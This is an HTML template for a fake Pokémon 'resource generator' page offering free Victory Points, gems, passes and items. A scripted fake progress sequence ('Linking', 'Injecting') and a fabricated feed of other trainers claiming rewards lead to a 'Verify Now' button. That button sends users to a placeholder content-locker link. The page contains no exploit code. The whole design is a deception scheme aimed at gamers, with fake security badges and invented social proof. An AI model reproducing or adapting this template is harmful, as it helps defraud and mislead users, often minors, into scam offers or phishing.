<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Pokémon Champions 2026 - Global Resource Sync</title>
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Inter:wght@300;500;800&display=swap');

        :root {
            --primary: #00f2ff;
            --accent: #ff007a;
            --gold: #ffcc00;
            --glass-bg: rgba(10, 15, 30, 0.98);
            --neon-shadow: 0 0 20px rgba(0, 242, 255, 0.4);
        }

        body {
            background: #02050a;
            color: #fff;
            font-family: 'Inter', sans-serif;
            margin: 0;
            padding: 0;
            overflow-x: hidden;
            background: radial-gradient(circle at center, #0a1020 0%, #02050a 100%);
        }

        nav {
            background: rgba(0,0,0,0.9);
            padding: 15px 5%;
            display: flex;
            justify-content: space-between;
            align-items: center;
            border-bottom: 1px solid var(--primary);
            backdrop-filter: blur(10px);
        }

        .container {
            display: flex;
            flex-direction: column;
            align-items: center;
            padding: 40px 20px;
        }

        .main-card {
            background: var(--glass-bg);
            border: 1px solid rgba(0, 242, 255, 0.2);
            border-radius: 30px;
            width: 100%;
            max-width: 480px;
            padding: 40px;
            box-shadow: 0 25px 60px rgba(0,0,0,0.9), var(--neon-shadow);
            position: relative;
            text-align: center;
            box-sizing: border-box;
        }

        .badge-pro {
            background: linear-gradient(45deg, var(--primary), var(--accent));
            font-size: 0.6rem;
            padding: 6px 12px;
            border-radius: 50px;
            font-weight: 900;
            position: absolute;
            top: 25px;
            right: 25px;
            box-shadow: 0 0 15px var(--accent);
        }

        h2 { font-family: 'Orbitron', sans-serif; text-transform: uppercase; color: var(--primary); margin-top: 30px; }

        .grid-rewards {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 15px;
            margin: 25px 0;
        }

        .reward-card {
            background: rgba(255, 255, 255, 0.03);
            border: 1px solid rgba(255, 255, 255, 0.1);
            border-radius: 20px;
            padding: 25px 10px;
            cursor: pointer;
            transition: 0.3s;
            display: flex;
            flex-direction: column;
            align-items: center;
        }

        .reward-card.active {
            border-color: var(--primary);
            background: rgba(0, 242, 255, 0.1);
            box-shadow: 0 0 20px rgba(0, 242, 255, 0.2);
        }

        /* ICONS BLAST T-TSAWER */
        .icon-box {
            font-size: 2.5rem;
            margin-bottom: 15px;
            filter: drop-shadow(0 0 10px rgba(255,255,255,0.2));
        }

        .reward-card span { display: block; font-weight: 900; font-size: 1.1rem; font-family: 'Orbitron'; }
        .reward-card small { color: var(--primary); font-size: 0.7rem; font-weight: bold; text-transform: uppercase; }

        .btn-action {
            background: linear-gradient(to right, var(--primary), #00a2ff);
            color: #000;
            width: 100%;
            padding: 20px;
            border: none;
            border-radius: 15px;
            font-weight: 900;
            font-size: 1.2rem;
            cursor: pointer;
            text-transform: uppercase;
            font-family: 'Orbitron', sans-serif;
            margin-top: 15px;
            transition: 0.3s;
        }
        .btn-action:hover { transform: scale(1.02); }

        .activity-feed {
            margin-top: 25px;
            padding: 12px;
            background: rgba(0,0,0,0.6);
            border-radius: 50px;
            font-size: 0.8rem;
            color: var(--primary);
            border: 1px solid rgba(0,242,255,0.1);
        }

        .hidden { display: none; }

        .loader {
            width: 50px; height: 50px; border: 4px solid #111; border-top: 4px solid var(--primary);
            border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto 20px;
        }
        @keyframes spin { 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>

<nav>
    <div style="font-family: 'Orbitron'; font-weight: 900; color: #fff; font-size: 1.2rem;">
        POKÉ<span style="color: var(--primary);">MON</span>
    </div>
    <div style="font-size: 0.7rem; color: #2ecc71; font-weight: bold;">● ENCRYPTED</div>
</nav>

<div class="container">
    <div class="main-card">
        <div class="badge-pro">SECURE v4.2</div>
        
        <div id="ui-step1">
            <h2>Select Item</h2>
            <div class="grid-rewards">
                <div class="reward-card active" onclick="selectReward(this, '50,000 Victory Points')">
                    <div class="icon-box" style="color: #ff4757;"><i class="fas fa-circle-dot"></i></div>
                    <span>50,000</span>
                    <small>Victory Points</small>
                </div>
                <div class="reward-card" onclick="selectReward(this, '10,000 Gems')">
                    <div class="icon-box" style="color: var(--primary);"><i class="fas fa-gem"></i></div>
                    <span>10,000</span>
                    <small>Champion Gems</small>
                </div>
                <div class="reward-card" onclick="selectReward(this, 'Elite Pass')">
                    <div class="icon-box" style="color: var(--accent);"><i class="fas fa-id-card-clip"></i></div>
                    <span>S12</span>
                    <small>Elite Pass</small>
                </div>
                <div class="reward-card" onclick="selectReward(this, 'Omni Stone')">
                    <div class="icon-box" style="color: var(--gold);"><i class="fas fa-meteor"></i></div>
                    <span>OMNI</span>
                    <small>Evolution Stone</small>
                </div>
            </div>
            <button class="btn-action" onclick="toStep2()">Start Generation</button>
        </div>

        <div id="ui-sync" class="hidden" style="padding: 40px 0;">
            <div class="loader"></div>
            <h4 id="status-text" style="color: var(--primary); font-family: 'Orbitron';">Initializing...</h4>
            <div style="width: 100%; background: #111; height: 8px; border-radius: 10px; overflow: hidden; margin-top: 20px;">
                <div id="progress-bar" style="width: 0%; height: 100%; background: var(--primary); transition: 0.2s;"></div>
            </div>
        </div>

        <div id="ui-locker" class="hidden">
            <h3 style="color: var(--accent); font-family: 'Orbitron';">Final Verification</h3>
            <p style="font-size: 0.85rem; color: #ccc;">Syncing <span id="summary-res" style="color: var(--primary); font-weight:bold;">...</span> to your account. Complete the last step.</p>
            <div style="background: rgba(0, 242, 255, 0.05); padding: 25px; border: 2px dashed var(--primary); border-radius: 20px; margin: 20px 0;">
                <button class="btn-action" style="margin:0; background: var(--accent); color:#fff;" onclick="window.location.href='YOUR_LINK_HERE'">Verify Now</button>
            </div>
        </div>

        <div class="activity-feed">
            <i class="fas fa-bolt"></i> <span id="live-text">Waiting for trainer...</span>
        </div>
    </div>
</div>

<script>
    let selectedItem = "50,000 Victory Points";

    function selectReward(el, name) {
        document.querySelectorAll('.reward-card').forEach(r => r.classList.remove('active'));
        el.classList.add('active');
        selectedItem = name;
    }

    function toStep2() {
        document.getElementById('ui-step1').classList.add('hidden');
        document.getElementById('ui-sync').classList.remove('hidden');
        document.getElementById('summary-res').innerText = selectedItem;
        
        let progress = 0;
        const steps = ['Linking...', 'Encrypting...', 'Injecting...', 'Finishing...'];
        
        const interval = setInterval(() => {
            progress += 5;
            document.getElementById('progress-bar').style.width = progress + '%';
            document.getElementById('status-text').innerText = steps[Math.floor(progress/26)] || 'Ready!';
            
            if(progress >= 100) {
                clearInterval(interval);
                setTimeout(() => {
                    document.getElementById('ui-sync').classList.add('hidden');
                    document.getElementById('ui-locker').classList.remove('hidden');
                }, 500);
            }
        }, 150);
    }

    setInterval(() => {
        const t = ['Ash_Pro', 'PokeMaster', 'Shadow_26', 'Sara_PKM'][Math.floor(Math.random()*4)];
        const r = ['10,000 Gems', 'Elite Pass', '50,000 VP'][Math.floor(Math.random()*3)];
        document.getElementById('live-text').innerText = `Trainer \`${t}\` successfully claimed ${r}!`;
    }, 4000);
</script>

</body>
</html>
